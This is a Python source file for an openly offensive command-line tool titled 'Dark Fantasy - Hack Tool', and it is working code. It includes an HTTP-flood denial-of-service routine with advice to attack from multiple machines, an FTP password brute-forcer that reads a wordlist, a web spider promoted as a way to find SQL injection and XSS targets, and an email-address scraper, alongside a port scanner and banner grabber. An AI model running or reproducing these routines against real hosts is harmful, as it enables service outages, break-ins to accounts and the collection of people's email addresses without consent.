import socket
from datetime import datetime
import urllib.request
import urllib.error
import urllib.parse
from subprocess import call
from html2text import html2text
from random import choice
from time import *
from string import *
import re
import platform
from pathlib import Path


user_agents = (
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
)


operSys = platform.system()


def clear_scr():
    if operSys == "Windows":
        call('cls', shell=True)
    if operSys == "Linux":
        call('clear', shell=True)


def dos(host):
    clear_scr()

    print("[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
    print("[*]Host to attack: "+host)
    ip = socket.gethostbyname(host)
    print("[*]IP of the host: "+ip+"\n\n")
    conn = input(
        "Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
    conn = int(conn)

    for i in range(conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print("Unable to create Socket. Retrying.")
            continue
        try:
            s.connect((ip, 80))
        except:
            print("Unable To Connect. Retrying.")
            continue
        print("[*]FLOODING!")
        s.send("GET / HTTP/1.1\r\n".encode())
        s.send("Host: ".encode()+host.encode()+"\r\n".encode())
        s.send("User-Agent: ".encode()+choice(user_agents).encode()+"\r\n\r\n".encode())
        s.close()


def scanner(host):
    clear_scr()

    t1 = datetime.now()
    socket.setdefaulttimeout(2)
    print("[*] Scanning "+host)
    print("[*] Starting Scanning at "+str(t1))
    host = socket.gethostbyname(host)
    print("[*] IP of host: "+host)
    ports = [1, 5, 7, 18, 20, 21, 22, 23, 25, 43, 42, 53, 80, 109,
             110, 115, 118, 443, 194, 161, 445, 156, 137, 139, 3306]
    try:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, port))
            if result == 0:
                print("Port {}: \t Open".format(port))
            sock.close()

    except KeyboardInterrupt:
        return print("You pressed Ctrl+C")
    except socket.gaierror:
        return print('Hostname could not be resolved. Exiting')
    except socket.error:
        return print("Couldn't connect to server")

    t2 = datetime.now()
    timetaken = t2-t1
    print("[*] Scanning ended at: "+str(t2)+"\n")
    print("[*] Time taken= "+str(timetaken))


def banner(host):
    clear_scr()

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        "Error"
    host = socket.gethostbyname(host)
    port = int(input("[*] Enter the port of the service: "))
    try:
        s.connect((host, port))
        print("[*] connection successfull\nWaiting for the banner...\n")
        if port == 80:
            msg = 'HEAD / HTTP/1.0\r\n\r\n'
            msg = msg.encode()
            s.send(msg)
        data = s.recv(1024)
        print("Banner:\n"+data.decode())

        s.close()
    except Exception as e:
        print(e)


def ask_file():
    while 1:
        path = Path(input(
            f"Enter the file name (eg: pass.txt, wordlist.txt)\n>"))
        if not path.is_file():
            print('[!] No such file!')
            continue
        return path


def ftp(server):
    clear_scr()

    print("[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n")
    passwords = ask_file().read_text().splitlines()
    username = input("Enter the username to hack(eg: admin, root): ")

    server = socket.gethostbyname(server)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except:
        return print("Unable to create Socket.")
    try:
        s.connect((server, 21))
    except:
        return print("Unable To Connect.")
    data = s.recv(1024)
    for password in passwords:
        s.send('USER '.encode() + username.encode() + '\r\n'.encode())
        data = s.recv(1024)
        s.send('PASS '.encode() + password.encode()+'\r\n'.encode())
        data = s.recv(1024).decode()
        print(data)
        print("[*] Tried: "+password+"\n")
        if "230" in data:
            print("password found\n")
            return print("[*] Password is: " + password)
        else:
            print('[*] '+password+" is incorrect")
    s.send("Quit\r\n".encode())
    s.close
    print("No password Found. Try another word list or username.")


def spider(host):
    clear_scr()

    print("[*] Use the result to find promising URLs/Emails to try hacking using SQL injection or Xss or Social Engineering etc.\n[*] Depth is the level to go inside the website( usually a small integer ).\n[*] Output will also be saved in text files in the same folder as this software.\n")
    depth = input("Enter the depth level in numbers: ")
    count = 1
    href_pattern = re.compile('''href=["'](.[^"']+)["']''')
    url = "http://"+host
    with Path(f"depth1.txt").open('w') as out_file:
        for i in href_pattern.findall(str(urllib.request.urlopen(url).read()), re.I):
            if "http" not in i:
                i = "http://"+host+i
            print(i)
            out_file.write(i+'\n')
    while(count < int(depth)):
        with Path("depth"+str(count)+".txt").open() as read_file:
            with Path("depth"+str(count+1)+".txt").open("w+") as write_file:
                read = read_file.read().splitlines()
                if not read:
                    print("\n****Finished****")
                    return depth
                for link in read:
                    if "http" not in link:
                        link = "http://"+host+link
                    try:
                        for k in href_pattern.findall(str(urllib.request.urlopen(link).read()), re.I):
                            print(k)
                            write_file.write(k+"\n")
                    except:
                        continue
        count += 1
    return depth


def email(host):
    clear_scr()

    depth = input("Enter the depth level in numbers: ")
    count = 1
    with Path("emails.txt").open("w+") as emails:
        print("[*] Email addresses found on page: ")
        while (count <= int(depth)):
            f = Path("depth"+str(count)+".txt").read_text()
            if not f:
                return print("\n****Finished****")
            f = f.splitlines()
            for j in f:
                try:
                    e = urllib.request.urlopen(j)
                except:
                    continue

                try:
                    cont = html2text(e.read())
                except UnicodeDecodeError:
                    try:
                        cont = html2text(
                            urllib.request.urlopen(j).read().decode('utf-8'))
                    except:
                        try:
                            cont = urllib.request.urlopen(j).read()
                        except:
                            continue

                cont = cont.splitlines()
                for line in cont:
                    if '@' in line:
                        print(line)
                        emails.write(line+"\n")

                count += 1


def ask_host():
    hostname = input(
        "Enter hostname or IP address (google.com, www.yoursite.com, 192.168.1.1): ")
    if '://' in hostname:
        hostname = hostname.split('://')[1]
    return hostname


def main():
    while 1:
        print("-"*60+"\n")
        print("                  Dark Fantasy - Hack Tool                    ")
        print("-"*60+"\n")
        print("1.Port Scanning\n2.DDOS\n3.Banner Grabbing\n4.Web spider(gather all URLs for web hacking)\n5.FTP Password Cracker\n6.Email Scraping")
        try:
            choice = int(input("Enter Your Choice: "))
        except (ValueError, EOFError, KeyboardInterrupt):
            return print('\n[!] Interrupted!')

        if choice not in range(7):
            return print('Invalid choice')

        hostname = ask_host()
        if choice == 1:
            scanner(hostname)
        elif choice == 6:
            email(hostname)
        elif choice == 3:
            banner(hostname)
        elif choice == 5:
            ftp(hostname)
        elif choice == 2:
            dos(hostname)
        elif choice == 4:
            spider(hostname)
        else:
            print("Invalid choice")


if __name__ == '__main__':
    main()
